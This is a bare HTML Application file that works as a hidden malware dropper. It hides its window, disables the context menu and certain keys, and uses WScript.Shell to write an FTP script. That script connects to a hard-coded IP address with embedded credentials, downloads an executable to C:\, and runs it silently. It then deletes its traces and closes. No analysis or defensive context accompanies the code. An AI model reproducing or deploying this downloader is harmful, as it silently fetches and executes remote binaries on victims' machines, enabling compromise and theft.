<html>
<title>xxx</title>
<head>


<SCRIPT language=javascript> 
function F() 
{
setTimeout("F()", 2000); 
}
setTimeout("F()", 2000);
parent.moveTo((screen.width-1000)/2,(screen.height-1000)/2);
parent.resizeTo(-1000,-1000);
</SCRIPT>
</head>
<HTA:APPLICATION caption="no" border="none"
SHOWINTASKBAR="no">
<body bgcolor="#ffffff" text="#000000" scroll="no" leftmargin="2" topmargin="3" 
marginwidth="0" marginheight="0" oncontextmenu='self.event.returnvalue=0' 
onkeydown="javascript:if(event.keyCode==27 || event.keyCode==78 && event.ctrlKey)return 
false;">
</body>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language="VBScript">
Dim fs, t
Set fs = CreateObject("Scripting.FileSystemObject")
Set t = fs.CreateTextFile("mail.txt",True)
t.WriteLine("open 61.152.108.159")
t.WriteLine("web")
t.WriteLine("web")
t.WriteLine("bin")
t.WriteLine("lcd c:\")
t.WriteLine("get sssss.exe")
t.WriteLine("bye")
t.Close 
wsh.Run "ftp -s:mail.txt",0,true
wsh.Run "c:\sssss.exe"
fs.DeleteFile "mail.txt",true
</script>
<script language="VBScript">
<!--
window.close
//-->
</script>
</html>
